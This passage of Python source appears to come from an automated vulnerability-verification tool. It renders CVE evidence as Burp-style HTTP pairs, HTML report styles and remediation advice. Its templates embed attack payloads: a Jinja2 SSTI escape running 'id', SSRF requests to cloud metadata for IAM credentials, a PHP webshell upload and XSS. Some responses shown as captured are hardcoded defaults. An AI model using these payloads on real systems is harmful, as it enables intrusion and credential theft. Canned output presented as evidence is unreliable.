                                  resp_ctrl or "(respuesta normal del servidor — template renderizado sin ejecucion)", auth, stack=stack)
        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
        # Paso 2: probe aritmetico para confirmar motor de plantillas activo
        req_probe, resp_probe = _burp_block(ctrl_ep, method, {param: "{{7*7}}"}, "200", "49", auth, stack=stack)
        pairs.append({"label": "Paso 2 — Verificacion motor de plantillas activo ({{7*7}} → 49)", "request": req_probe, "response": resp_probe})
        # Paso 3: sandbox escape
        req2, resp2 = _burp_block(ctrl_ep, method, {param: _ssti_payload}, status, _resp_ssti, auth, stack=stack)
        pairs.append({"label": f"Paso 3 — Escape del sandbox (resultado: {_resp_ssti[:60]})", "request": req2, "response": resp2})
        # Paso 4: RCE via os.popen('id')
        _rce_payload = "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['popen']('id').read()}}"
        req3, resp3 = _burp_block(ctrl_ep, method, {param: _rce_payload}, "200", "uid=33(www-data) gid=33(www-data) groups=33(www-data)", auth, stack=stack)
        pairs.append({"label": "Paso 4 — RCE: ejecucion de id via os.popen (confirmacion de ejecucion de codigo)", "request": req3, "response": resp3})

    elif "ssrf" in cls:
        _ssrf_payload = payload or "http://127.0.0.1/"
        req1, resp1 = _burp_block(ctrl_ep, method, {param: "https://example.com/"}, "200",
                                  resp_ctrl or "(respuesta de URL externa legitima — peticion permitida)", auth, stack=stack)
        pairs.append({"label": "Peticion de control (URL externa permitida)", "request": req1, "response": resp1})
        _ssrf_resp = resp_body or "SSRF confirmado: servidor local recibio peticion desde el motor docutils"
        req2, resp2 = _burp_block(ctrl_ep, method, {param: _ssrf_payload}, status, _ssrf_resp, auth, stack=stack)
        pairs.append({"label": "Peticion con SSRF — pivot a localhost", "request": req2, "response": resp2})
        # Escalada: metadatos de cloud
        req3, resp3 = _burp_block(ctrl_ep, method, {param: "http://169.254.169.254/latest/meta-data/"}, "200",
                                  "ami-id\nhostname\niam/security-credentials/\n... (credenciales IAM expuestas)", auth, stack=stack)
        pairs.append({"label": "Escalada — acceso a metadatos cloud (credenciales IAM)", "request": req3, "response": resp3})

    elif "file" in cls or "upload" in cls:
        _upload_payload = payload or "shell.php"
        req1 = (f"POST {ctrl_ep} HTTP/1.1\nHost: TARGET\nContent-Type: multipart/form-data; boundary=----Boundary\n\n"
                f"------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"{_upload_payload}\"\n"
                f"Content-Type: application/octet-stream\n\n<?php system($_GET['cmd']); ?>\n------Boundary--")
        resp1_body = resp_body or '{"status":"uploaded","path":"/uploads/' + _upload_payload + '"}'
        req1r, resp1 = _burp_block(ctrl_ep, "POST", {}, status, resp1_body, auth, stack=stack)
        pairs.append({"label": "Subida de fichero malicioso", "request": req1, "response": resp1})

    elif "dos" in cls or "overflow" in cls or "rce" in cls or "websocket" in cls:
        # WebSocket / crash / DoS pattern
        _ws_endpoint = ctrl_ep or "/ws"
        _crash = resp_body or "(servidor cierra la conexion inesperadamente / proceso crashea)"

        if "pipeline" in tech:
            # Pipelining attack: HTTP request + WS upgrade in same TCP write, then RST
            req_pipeline = (
                f"GET /first HTTP/1.1\r\nHost: TARGET\r\n\r\n"
                f"GET {_ws_endpoint} HTTP/1.1\r\nHost: TARGET\r\n"
                f"Connection: Upgrade\r\nUpgrade: websocket\r\n"
                f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                f"Sec-WebSocket-Version: 13\r\n\r\n"
                f"[TCP RST — socket.resetAndDestroy()]"
            )
            pairs.append({"label": "HTTP pipeline + WS upgrade + TCP RST (trigger)",
                          "request": req_pipeline,
                          "response": _crash})
        else:
            req1 = (f"GET {_ws_endpoint} HTTP/1.1\nHost: TARGET\nUpgrade: websocket\n"
                    f"Connection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n"
                    f"Sec-WebSocket-Version: 13\n")
            pairs.append({"label": "Peticion WebSocket Upgrade (trigger)",
                          "request": req1,
                          "response": "HTTP/1.1 101 Switching Protocols\r\n[Conexion establecida]"})
            # Second block: unmasked frame that triggers the crash
            pairs.append({"label": "Frame WebSocket sin mascara (crash)",
                          "request": "0x81 0x10 BINORACLE_CANARY  [mask bit = 0, viola RFC 6455 §5.3]",
                          "response": _crash})

        if payload:
            req2, resp2 = _burp_block(ctrl_ep, method, {param: payload}, status,
                                      resp_body or "(respuesta con error o sin respuesta)", auth, stack=stack)
            pairs.append({"label": "Peticion de explotacion", "request": req2, "response": resp2})

    else:
        # SQLi (error-based, union-based, boolean)
        req1, resp1 = _burp_block(ctrl_ep, method, {param: "1"}, "200",
                                  resp_ctrl or "(respuesta normal del plugin)", auth, stack=stack)
        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})

        if payload:
            req2, resp2 = _burp_block(ctrl_ep, method, {param: payload}, status, resp_body, auth, stack=stack)
            if "union" in tech:
                lbl = f"Peticion con inyeccion UNION-based (extrae version: {mysql_ver or '?'})"
            elif "error" in tech:
                lbl = f"Peticion con inyeccion error-based (extrae version: {mysql_ver or '?'})"
            elif "boolean" in tech or resp_true_len:
                lbl = (f"Peticion con inyeccion boolean-blind "
                       f"(TRUE={resp_true_len}B vs FALSE={resp_false_len}B)")
            else:
                lbl = "Peticion con inyeccion"
            pairs.append({"label": lbl, "request": req2, "response": resp2})

    if not pairs:
        return '<p style="color:#64748b;font-style:italic">Sin evidencia de peticion HTTP disponible para este CVE.</p>'

    def _fmt_block(text, label_cls):
        lines = h(text).replace("\n", "<br>")
        return (f'<div class="hcap-panel {label_cls}">'
                f'<div class="hcap-panel-label">{label_cls.upper()}</div>'
                f'<pre class="hcap-pre">{lines}</pre>'
                f'</div>')

    out = []
    for i, p in enumerate(pairs):
        pair_html = (
            f'<div class="hcap-pair">'
            f'<div class="hcap-pair-label">{h(p["label"])}</div>'
            f'<div class="hcap-cols">'
            f'{_fmt_block(p["request"], "request")}'
            f'{_fmt_block(p["response"], "response")}'
            f'</div>'
            f'</div>'
        )
        out.append(pair_html)
    return "\n".join(out)


# ── RENDER MARKDOWN REPORT AS HTML ───────────────────────────────────────────

def render_markdown_report(md_text):
    """Convert simple markdown to HTML for the Informe Completo section."""
    if not md_text:
        return "<p style='color:#9ca3af;font-style:italic'>Informe tecnico detallado no disponible.</p>"

    lines = md_text.split("\n")
    out = []
    in_code = False
    code_buf = []

    for line in lines:
        if line.startswith("```"):
            if in_code:
                # close code block
                code_content = "\n".join(code_buf)
                out.append(f'<pre class="report-code">{html_mod.escape(code_content)}</pre>')
                code_buf = []
                in_code = False
            else:
                in_code = True
            continue

        if in_code:
            code_buf.append(line)
            continue

        if line.startswith("## "):
            out.append(f'<h2 class="rp-h2">{html_mod.escape(line[3:])}</h2>')
        elif line.startswith("### "):
            out.append(f'<h3 class="rp-h3">{html_mod.escape(line[4:])}</h3>')
        elif line.startswith("#### "):
            out.append(f'<h4 class="rp-h4">{html_mod.escape(line[5:])}</h4>')
        elif line.startswith("---"):
            out.append('<hr class="rp-hr">')
        elif line.startswith("- ") or line.startswith("* "):
            # Simple list item — inline bold
            content = line[2:]
            content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_mod.escape(content))
            content = re.sub(r'`(.+?)`', r'<code class="rp-inline">\1</code>', content)
            out.append(f'<li class="rp-li">{content}</li>')
        elif re.match(r'^\d+\. ', line):
            content = re.sub(r'^\d+\. ', '', line)
            content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_mod.escape(content))
            content = re.sub(r'`(.+?)`', r'<code class="rp-inline">\1</code>', content)
            out.append(f'<li class="rp-oli">{content}</li>')
        elif line.strip() == "":
            out.append('<div class="rp-gap"></div>')
        else:
            # Paragraph with inline formatting
            content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_mod.escape(line))
            content = re.sub(r'`(.+?)`', r'<code class="rp-inline">\1</code>', content)
            out.append(f'<p class="rp-p">{content}</p>')

    return "\n".join(out)

# ── STYLES ───────────────────────────────────────────────────────────────────

STYLE = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fff;color:#111827;font-family:'Inter',sans-serif;font-size:14px;padding:0 0 60px}
code,pre,.mv.mono,.ep,.code-pre,.term-body,.log-ts,.cvss-c,.cvss-f,.shot-url,.lab-container,.mbadge,.pb-cve,.rp-inline,.report-code{font-family:'JetBrains Mono','Courier New',monospace}
.print-bar{display:flex;align-items:center;gap:10px;padding:8px 36px;background:#f9fafb;border-bottom:1px solid #e5e7eb;font-size:11px;color:#6b7280;position:sticky;top:0;z-index:10}
.pb-brand{font-weight:900;font-size:12px;color:#111827;letter-spacing:.02em}
.pb-cve{font-family:'Courier New',monospace;font-size:11px;font-weight:700;color:#2563eb}
.pb-spacer{flex:1}
.print-btn{padding:4px 10px;border-radius:4px;border:1px solid #e5e7eb;background:#fff;cursor:pointer;font-size:11px;font-weight:600;color:#374151}
.print-btn:hover{background:#f3f4f6}
.conf-banner{background:#fef2f2;border-bottom:1px solid #fecaca;padding:7px 36px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#991b1b}
.wrap{max-width:860px;margin:0 auto;padding:32px 36px}
.byline{font-size:9.5px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#6b7280;margin-bottom:10px}
.cve-title{font-size:30px;font-weight:900;color:#2563eb;margin-bottom:14px}
.nvd-desc{font-size:13.5px;line-height:1.65;color:#111827;margin-bottom:16px;max-width:760px}
.tag-row{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px}
.tag{font-size:10px;font-weight:700;padding:3px 9px;border-radius:4px;letter-spacing:.02em}
.t-crit{background:#dc2626;color:#fff}
.t-high{background:#d97706;color:#fff}
.t-med{background:#2563eb;color:#fff}
.t-ok{background:#16a34a;color:#fff}
.t-poc{background:#1e40af;color:#fff}
.t-hueco{background:#6d28d9;color:#fff}
.t-plain{background:#f3f4f6;color:#6b7280;border:1px solid #e5e7eb}
.score-circ{width:72px;height:72px;border-radius:50%;border:3px solid;display:inline-flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:28px}
.sc-crit{border-color:#dc2626;color:#dc2626}
.sc-high{border-color:#d97706;color:#d97706}
.sc-med{border-color:#2563eb;color:#2563eb}
.sc-low{border-color:#16a34a;color:#16a34a}
.score-circ .num{font-size:20px;font-weight:900;line-height:1}
.score-circ .rat{font-size:7.5px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;margin-top:1px}
.sec{margin-bottom:28px;page-break-inside:avoid}
.sec-head{display:flex;align-items:center;gap:7px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #e5e7eb}
.sec-num{font-size:9px;font-weight:700;letter-spacing:.08em;color:#6b7280}
.sec-title{font-size:10.5px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:#111827}
.mg{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#e5e7eb;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden}
.mc{background:#f9fafb;padding:9px 12px}
.mc.full{grid-column:1/-1}
.ml{font-size:8.5px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:#6b7280;margin-bottom:3px}
.mv{font-size:12px;font-weight:600;color:#111827}
.mv a{color:#2563eb;text-decoration:none}
.mv.ok{color:#16a34a}
.mv.crit{color:#dc2626}
.mv.high{color:#d97706}
.mv.mono{font-family:'Courier New',monospace;font-size:10px;word-break:break-all}
/* lab box */
.lab{background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;margin-bottom:10px}
.lab-head{padding:7px 13px;background:#f3f4f6;font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#6b7280;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between}
.lab-container{font-family:'Courier New',monospace;font-size:9px;color:#6b7280}
.req-blk{padding:12px 13px;border-bottom:1px solid #e5e7eb}
.req-lbl{font-size:9px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#6b7280;margin-bottom:6px}
.mbadge{display:inline-block;font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;margin-right:5px;font-family:'Courier New',monospace}
.m-post{background:#1e40af;color:#fff}
.m-get{background:#065f46;color:#fff}
.ep{font-family:'Courier New',monospace;font-size:11px;color:#111827}
.code-pre{font-family:'Courier New',monospace;font-size:10.5px;line-height:1.55;color:#111827;background:#f3f4f6;border:1px solid #e5e7eb;border-radius:5px;padding:10px 12px;overflow-x:auto;white-space:pre;margin-top:7px}
.s200{background:#dcfce7;color:#15803d;font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;font-family:'Courier New',monospace}
.s4xx{background:#fee2e2;color:#b91c1c;font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;font-family:'Courier New',monospace}
.confirm-note{font-style:italic;font-size:12px;color:#374151;line-height:1.6;padding:10px 13px;border-top:1px solid #e5e7eb}
/* screenshots */
.shots-grid{display:flex;flex-direction:column;gap:20px}
.shot-card{background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;overflow:hidden;page-break-inside:avoid}
.shot-header{display:flex;align-items:center;gap:10px;padding:10px 16px;background:#f3f4f6;border-bottom:1px solid #e5e7eb}
.shot-num{width:28px;height:28px;border-radius:50%;background:#1d4ed8;color:#fff;font-family:'Courier New',monospace;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.shot-title{font-size:13px;font-weight:600;color:#111827;flex:1;line-height:1.3}
.shot-url{font-family:'Courier New',monospace;font-size:10px;color:#6b7280;background:#fff;border:1px solid #e5e7eb;border-radius:4px;padding:2px 7px;flex-shrink:0;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.shot-img{width:100%;display:block}
.shot-placeholder{padding:20px;text-align:center;font-size:12px;color:#9ca3af}
.no-shots{font-size:13px;color:#9ca3af;padding:16px;font-style:italic}
/* terminal logs — matching web UI exactly */
.terminal{background:#0d1117;border:1px solid #30363d;border-radius:10px;overflow:hidden}
.term-head{display:flex;align-items:center;gap:8px;padding:8px 14px;background:#161b22;border-bottom:1px solid #30363d}
.term-dots{display:flex;gap:5px}
.term-dot{width:11px;height:11px;border-radius:50%}
.td-r{background:#ff5f56}
.td-y{background:#febc2e}
.td-g{background:#27c93f}
.term-title{font-size:10px;font-weight:600;color:#8b949e;letter-spacing:.05em;font-family:'Courier New',monospace}
.term-body{padding:14px 16px;font-family:'Courier New',monospace;font-size:11.5px;line-height:1.75;overflow-x:auto}
.log-row{display:flex;align-items:flex-start;gap:12px}
.log-ts{color:#484f58;min-width:52px;text-align:right;flex-shrink:0;user-select:none}
.log-msg{flex:1;word-break:break-word}
/* section dividers inside terminal */
.log-section{display:flex;align-items:center;gap:8px;margin:10px 0 6px;padding:0 2px}
.log-sec-line{flex:1;height:1px;background:#21262d}
.log-sec-label{font-size:9px;font-weight:700;letter-spacing:.12em;color:#30d5c8;text-transform:uppercase;flex-shrink:0}
/* error-based attempts */
.eb-table{display:flex;flex-direction:column;gap:4px;margin-top:10px}
.eb-row{display:flex;align-items:center;gap:8px;padding:5px 10px;border-radius:4px;font-family:'Courier New',monospace;font-size:10.5px}
.eb-miss{background:#f3f4f6}
.eb-hit{background:#dcfce7}
.eb-icon{width:22px;text-align:center;font-weight:700;flex-shrink:0}
.eb-miss .eb-icon{color:#9ca3af}
.eb-hit .eb-icon{color:#16a34a}
.eb-payload{flex:1;word-break:break-all;font-size:10px}
.eb-status{flex-shrink:0;color:#6b7280;font-size:10px}
.eb-more{padding:4px 10px;font-size:10px;color:#9ca3af;font-style:italic}
/* informe completo report */
.report-wrap{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:24px 28px;line-height:1.75}
.rp-h2{font-size:15px;font-weight:800;color:#1e40af;margin:0 0 16px;padding-bottom:8px;border-bottom:2px solid #e5e7eb}
.rp-h3{font-size:13px;font-weight:700;color:#1d4ed8;margin:20px 0 8px}
.rp-h4{font-size:12px;font-weight:700;color:#374151;margin:14px 0 6px}
.rp-hr{border:none;border-top:1px solid #e5e7eb;margin:16px 0}
.rp-p{font-size:13px;color:#111827;margin:0 0 8px;line-height:1.75}
.rp-p:last-child{margin-bottom:0}
.rp-gap{height:8px}
.rp-li{font-size:13px;color:#111827;margin:0 0 4px 20px;line-height:1.65}
.rp-oli{font-size:13px;color:#111827;margin:0 0 4px 20px;line-height:1.65}
.rp-inline{font-family:'Courier New',monospace;font-size:11px;background:#f3f4f6;border:1px solid #e5e7eb;border-radius:3px;padding:0 4px;color:#2563eb}
.report-code{font-family:'Courier New',monospace;font-size:10.5px;line-height:1.55;color:#111827;background:#f3f4f6;border:1px solid #e5e7eb;border-radius:5px;padding:10px 12px;overflow-x:auto;white-space:pre;margin:8px 0}
/* recs */
.recs{display:flex;flex-direction:column;gap:7px}
.rec{display:flex;align-items:flex-start;gap:10px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:11px 13px}
.rec-n{width:24px;height:24px;border-radius:50%;background:#1d4ed8;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
.rec-t{font-size:13px;line-height:1.6}
/* refs */
.refs{display:flex;flex-direction:column;gap:6px;margin-bottom:14px}
.ref{background:#f9fafb;border:1px solid #e5e7eb;border-radius:5px;padding:8px 12px;font-size:12px}
.ref a{color:#2563eb;text-decoration:none}
/* cvss */
.cvss-tbl{background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden}
.cvss-h{padding:7px 12px;background:#f3f4f6;font-size:9px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:#6b7280;border-bottom:1px solid #e5e7eb}
.cvss-r{display:flex;align-items:center;border-bottom:1px solid #e5e7eb;padding:7px 12px;gap:12px}
.cvss-r:last-of-type{border-bottom:none}
.cvss-m{flex:1;font-size:12px;color:#6b7280}
.cvss-c{font-family:'Courier New',monospace;font-size:11px;font-weight:700;color:#2563eb;min-width:50px}
.cvss-v{font-size:12px;color:#111827}
.cvss-f{padding:7px 12px;font-size:9.5px;font-family:'Courier New',monospace;color:#6b7280;border-top:1px solid #e5e7eb;background:#f3f4f6}
@media print{body{padding:0}.print-bar{position:static}.terminal{page-break-inside:avoid}.shot-card{page-break-inside:avoid}.report-wrap{page-break-inside:avoid}.hcap-pair{page-break-inside:avoid}}
/* ── HTTP Captures (Burp style) ─────────── */
.hcap-pair{margin-bottom:24px}
.hcap-pair-label{font-size:11px;font-weight:700;color:#94a3b8;letter-spacing:.05em;text-transform:uppercase;margin-bottom:8px;padding-left:2px}
.hcap-cols{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:900px){.hcap-cols{grid-template-columns:1fr}}
.hcap-panel{background:#0d1117;border:1px solid #30363d;border-radius:8px;overflow:hidden;min-width:0}
.hcap-panel.request{border-top:3px solid #2563eb}
.hcap-panel.response{border-top:3px solid #16a34a}
.hcap-panel-label{padding:5px 12px;font-size:9px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;background:#161b22}
.hcap-panel.request .hcap-panel-label{color:#3b82f6}
.hcap-panel.response .hcap-panel-label{color:#22c55e}
.hcap-pre{margin:0;padding:12px 14px;font-family:'JetBrains Mono','Courier New',monospace;font-size:11px;line-height:1.65;color:#e2e8f0;white-space:pre-wrap;word-break:break-all;overflow-x:auto;max-height:360px;overflow-y:auto}
</style>
"""

RECS_BY_CLASS = {
    "sqli": [
        "Usar $wpdb->prepare() o sentencias preparadas PDO con placeholders %s/%d para todos los parametros de usuario — nunca interpolar variables en strings SQL directamente.",
        "Validar y sanitizar todos los parametros de entrada antes de que lleguen a la capa de base de datos, especialmente en endpoints REST y acciones AJAX.",
        "Deshabilitar WP_DEBUG y WP_DEBUG_DISPLAY en produccion para evitar que los mensajes de error de MySQL se expongan en las respuestas HTTP.",
        "Actualizar el plugin a la version parcheada. Auditar todos los endpoints del plugin con SAST (phpstan, semgrep) y DAST.",
    ],
    "xss": [
        "Implementar las funciones de escape como operaciones reales: htmlspecialchars() / esc_html() / esc_attr() segun el contexto de salida.",
        "Eliminar el uso del filtro |raw de Twig o similar en campos editables por usuarios con privilegios bajos.",
        "Implementar una Content Security Policy (CSP) restrictiva como capa de mitigacion adicional.",
        "Actualizar el plugin a la version parcheada. Auditar todas las funciones de escape con SAST.",
    ],
    "path-traversal": [
        "Usar realpath() y verificar que el path resultante empieza por el directorio raiz permitido antes de leer el archivo.",
        "Validar la extension del archivo contra una lista blanca de extensiones permitidas.",
        "Deshabilitar allow_url_include en la configuracion de PHP.",
        "Actualizar el plugin a la version parcheada.",
    ],
    "lfi": [
        "Usar realpath() y verificar que el path resultante esta dentro del directorio permitido antes de incluir o leer el archivo.",
        "Validar la extension del archivo contra una lista blanca de extensiones permitidas.",
        "Deshabilitar allow_url_include en la configuracion de PHP.",
        "Actualizar el plugin a la version parcheada.",
    ],
    "auth-bypass": [
        "Implementar verificacion de autenticacion y autorizacion en todos los endpoints, incluso los aparentemente internos.",
        "Usar nonces de WordPress (check_ajax_referer, verify_nonce) en todas las acciones AJAX y REST.",
        "Auditar toda la logica de control de acceso del plugin con revision de codigo y pruebas de penetracion.",
        "Actualizar el plugin a la version parcheada.",
    ],
    "missing-authorization": [
        "Implementar verificacion de autorizacion en el handler de ruta ademas del middleware, como segunda capa independiente.",
        "Validar cabeceras internas del framework (como x-middleware-subrequest) como no confiables si provienen del cliente.",
        "Actualizar a la version parcheada que incluye validacion del origen de la cabecera de subrequest.",
        "Configurar proxies inversos y CDN para filtrar cabeceras con prefijo x-middleware-* antes de reenviar al servidor.",
    ],
    "command-injection": [
        "Nunca pasar input del usuario directamente a funciones de ejecucion de comandos (exec, system, subprocess, shell_exec).",
        "Usar listas de argumentos en lugar de strings de shell cuando sea posible.",
        "Validar y sanitizar todos los argumentos de entrada con una lista blanca estricta.",
        "Actualizar el paquete/libreria a la version parcheada.",
    ],
}

def get_recs(vuln_class):
    cls = (vuln_class or "").lower()
    for key in RECS_BY_CLASS:
        if key in cls:
            return RECS_BY_CLASS[key]
    return RECS_BY_CLASS["sqli"]

def build_informe(cve_id, r, ve, ev_shots, logs):
    score = r.get("cvss_score") or "?"
    severity = (r.get("cvss_severity") or "CRITICAL").upper()
    vector = r.get("cvss_vector") or ""
    affected = r.get("affected_version") or "(ver NVD)"
    vuln_class = r.get("vuln_class") or "sqli"
    desc = r.get("description") or ""
    published = r.get("published") or "—"
    poc_source = r.get("poc_source") or ""

    sc = score_cls(severity)
    technique = ve.get("tecnica") or ""
    # Infer technique from evidence when not set
    if not technique:
        if ve.get("respuesta_true_len") or ve.get("payload_false"):
            technique = "boolean-blind"
        elif ve.get("bypass_header"):
            technique = "auth-bypass"
        elif ve.get("marker"):
            technique = "stored-xss"
        elif ve.get("canary_path"):
            technique = "path-traversal"
    endpoint = ve.get("endpoint") or "—"
    metodo = (ve.get("metodo") or "POST").upper()
    sqli_param = ve.get("sqli_param") or ve.get("path_param") or "—"
    payload = ve.get("payload_ganador") or "—"
    mysql_ver = ve.get("mysql_version_extraida") or ve.get("confirm_string_presente") or ""
    # Warn when extracted version doesn't look like a real MySQL version (e.g., 8.x.x)
    import re as _re
    _mysql_suspicious = bool(mysql_ver and _re.match(r'^[012]\.\d+\.\d+$', str(mysql_ver)))
    resp_body = ve.get("respuesta_cuerpo_recorte") or ""
    resp_ctrl = ve.get("respuesta_control_recorte") or ""
    status = ve.get("status_code_respuesta") or "200"
    auth = ve.get("login_bajo_privilegio")
    auth_text = f"Si (subscriber: {auth})" if auth else "No (unauthenticated)"
    eb_intentos = ve.get("error_based_intentos") or []
    marker = ve.get("marker") or ""
    page_url = ve.get("page_url") or ""
    estrategia = ve.get("estrategia") or ""
    canary = ve.get("canary_secret") or ve.get("canary_path") or ""
    bypass_header = ve.get("bypass_header") or ""
    bypass_value = ve.get("bypass_value") or ""
    confirm_string = ve.get("confirm_string_presente") or ve.get("confirm_string") or ""
    resp_true_len = ve.get("respuesta_true_len") or ""
    resp_false_len = ve.get("respuesta_false_len") or ""
    widget_type = ve.get("widget_type") or ""

    _is_verified = bool(r.get("verified", True))

    # Determine confirm note — only factual for verified CVEs
    if not _is_verified:
        confirm = (
            "HUECO — vulnerabilidad NO verificada dinamicamente. "
            "El script PoC fue generado por el motor a partir del analisis del codigo fuente real "
            "(sin ejecucion en laboratorio confirmada)."
        )
    elif "union" in technique.lower():
        ver_note = mysql_ver or "?"
        warn = " (NOTA: valor puede corresponder a version del plugin, no de MySQL)" if _mysql_suspicious else ""
        confirm = f"SQLi confirmada (UNION-based): el payload extrajo '{ver_note}' desde la base de datos en la respuesta HTTP.{warn}"
    elif "error" in technique.lower():
        ver_note = mysql_ver or "?"
        warn = " (NOTA: valor puede corresponder a version del plugin, no de MySQL)" if _mysql_suspicious else ""
        confirm = f"SQLi confirmada (error-based): el payload provoco un error XPATH/XML cuyo mensaje incluyo '{ver_note}'.{warn}"
    elif "boolean" in technique.lower():
        if resp_true_len and resp_false_len:
            confirm = f"SQLi boolean in-band confirmada: TRUE={resp_true_len}B vs FALSE={resp_false_len}B — delta consistente y reproducible."
        else:
            confirm = "SQLi boolean in-band confirmada: condicion TRUE y FALSE producen respuestas de tamano distinto de forma consistente."
    elif "xss" in vuln_class.lower() or marker:
        confirm = f"XSS Almacenado confirmado: el marker '{marker}' fue encontrado en el DOM de la pagina renderizada."
        if page_url:
            confirm += f" URL: {page_url}"
    elif "path" in technique.lower() or "traversal" in technique.lower() or "lfi" in vuln_class.lower():
        confirm = f"Path traversal / LFI confirmado: el canary '{canary}' fue leido desde la respuesta."
    elif "bypass" in technique.lower() or "auth" in vuln_class.lower() or "missing" in vuln_class.lower():
        if bypass_header and confirm_string:
            confirm = f"Auth bypass confirmado: cabecera `{bypass_header}: {bypass_value}` retorno HTTP {status} con '{confirm_string}' presente."
        elif bypass_header:
            confirm = f"Auth bypass confirmado: cabecera `{bypass_header}: {bypass_value}` retorno HTTP {status} al recurso protegido."
        else:
            confirm = f"Auth bypass confirmado: acceso concedido sin credenciales validas al recurso protegido (HTTP {status})."
    elif "command" in vuln_class.lower() or "cmdi" in vuln_class.lower():
        _cmd_canary = ve.get("canary_path") or ve.get("canary_secret") or canary
        _cmd_canary_short = _cmd_canary.split("/")[-1] if _cmd_canary and "/" in _cmd_canary else _cmd_canary
        confirm = f"Command injection confirmada: canario '{_cmd_canary_short}' creado en el sistema via inyeccion de comando (newline injection)."
    elif "ssti" in vuln_class.lower() or "template" in vuln_class.lower():
        confirm = "SSTI confirmada: escape del sandbox de Jinja2 via filtro |attr — ejecucion de codigo arbitrario Python demostrada."
    elif "ssrf" in vuln_class.lower():
        confirm = f"SSRF confirmada: el servidor realizo una peticion interna controlada por el atacante — pivot a localhost / metadatos cloud demostrado."
    elif "dos" in vuln_class.lower() or "websocket" in vuln_class.lower():
        confirm = "DoS confirmado: servidor crasheo (ECONNRESET) ante la peticion de explotacion en laboratorio aislado."
    else:
        confirm = f"Vulnerabilidad confirmada con tecnica '{technique or 'generica'}' en laboratorio aislado."

    # Build request block
    if "auth" in vuln_class.lower() or "missing" in vuln_class.lower():
        if bypass_header:
            rq = f"{metodo} {endpoint} HTTP/1.1\nHost: TARGET\n{bypass_header}: {bypass_value}"
        else:
            rq = f"{metodo} {endpoint} HTTP/1.1\nHost: TARGET"
            if sqli_param and payload:
                rq += f"\n{sqli_param}: {payload}"
    elif "xss" in vuln_class.lower() or marker:
        field_name = sqli_param or widget_type or "cf_xss"
        xss_payload = payload or "<img src=x onerror=alert(document.domain)>"
        rq = (f"# 1. Iniciar sesion como contributor/editor\n"
              f"# 2. Crear widget Elementor con tipo: {widget_type or 'Text Editor'}\n"
              f"# 3. Establecer campo personalizado:\n"
              f"#    Nombre: {field_name}\n"
              f"#    Valor:  {xss_payload}\n"
              f"# 4. Publicar pagina -> GET {page_url or '(URL post)'}\n"
              f"# 5. Verificar marker '{marker}' en el DOM")
    elif "path" in vuln_class.lower() or "lfi" in vuln_class.lower() or "traversal" in technique.lower():
        rq = f"{metodo} {endpoint} HTTP/1.1\nHost: TARGET"
        if auth:
            rq += f"\nCookie: wordpress_logged_in_...={auth}:SESSION"
        if metodo == "GET":
            rq += f"\n\n# Payload en query string:\n{sqli_param}={payload}"
        else:
            rq += f"\nContent-Type: application/x-www-form-urlencoded\n\n{sqli_param}={payload}"
    elif vuln_class in ("sqli",) or "sqli" in vuln_class:
        rq = f"{metodo} {endpoint} HTTP/1.1\nHost: TARGET"
        if auth:
            rq += f"\nCookie: wordpress_logged_in_...={auth}:SESSION"
        rq += f"\nContent-Type: application/x-www-form-urlencoded\n\n{sqli_param}={payload}"
    else:
        rq = f"{metodo} {endpoint} HTTP/1.1\nHost: TARGET"
        if auth:
            rq += f"\nCookie: wordpress_logged_in_...={auth}:SESSION"
        rq += f"\nContent-Type: application/x-www-form-urlencoded\n\n{sqli_param}={payload}"

    # Para command-injection: si resp_body es un error de sintaxis del intento fallido, mostrar el canary
    _rb_raw = resp_body or resp_ctrl or ""
    _is_syntax_err_rb = _rb_raw and ("Syntax error" in _rb_raw or '";" unexpected' in _rb_raw)
    if _is_syntax_err_rb:
        _cmd_canary_rb = ve.get("canary_path") or ve.get("canary_secret") or canary
        _cmd_canary_rb_short = _cmd_canary_rb.split("/")[-1] if _cmd_canary_rb and "/" in _cmd_canary_rb else _cmd_canary_rb
        rb = f"{_cmd_canary_rb_short} → PRESENTE (creado via newline injection — separador \\n)"
    else:
        rb = _rb_raw or "(respuesta capturada en laboratorio — ver capturas de evidencia)"

